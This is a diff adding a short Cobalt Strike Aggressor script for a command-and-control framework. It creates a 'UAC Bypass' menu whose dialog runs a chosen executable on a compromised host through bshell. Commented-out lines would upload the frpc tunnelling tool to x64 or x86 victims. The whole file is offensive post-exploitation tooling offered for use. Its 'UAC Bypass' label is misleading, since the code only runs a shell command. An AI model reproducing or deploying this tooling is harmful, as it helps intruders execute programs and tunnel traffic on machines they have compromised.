@@ -1,0 +1,23 @@
+popup beacon_bottom {
+    menu "UAC Bypass"{
+        item "Upload" {
+            $bid = $1;
+            $dialog = dialog("CS上线文件", %(UploadPath => "C:\\Windows\\System32\\calc.exe", bid => $bid), &upload);
+            drow_text($dialog, "UploadPath",  "path: ");
+            dbutton_action($dialog, "Executing");
+            dialog_show($dialog);
+        }
+        sub upload {
+            # switch to specify path
+            # bcd($bid, $3['UploadPath']);
+            # bsleep($bid, 0 ,0);
+            bshell($bid, $3['UploadPath'])
+            # if (-is64 $bid['id']) {
+            #     bupload($bid, script_resource("/script/x64/frpc.exe"));
+            # }else{
+            #     bupload($bid, script_resource("/script/x86/frpc.exe"));
+            # }
+            show_message("Executing cmmand!");
+        }
+    }
+}
